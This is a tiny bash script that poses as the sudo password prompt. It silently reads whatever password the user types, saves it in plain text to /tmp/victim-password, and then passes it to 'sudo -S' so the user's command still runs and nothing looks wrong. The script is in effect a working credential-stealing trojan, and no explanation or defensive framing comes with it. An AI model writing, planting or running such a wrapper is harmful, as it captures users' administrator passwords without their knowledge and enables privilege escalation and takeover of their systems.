#!/bin/bash
echo "[sudo] enter your password:"
read -s password
echo $password > /tmp/victim-password
echo $password | sudo -S "$@"
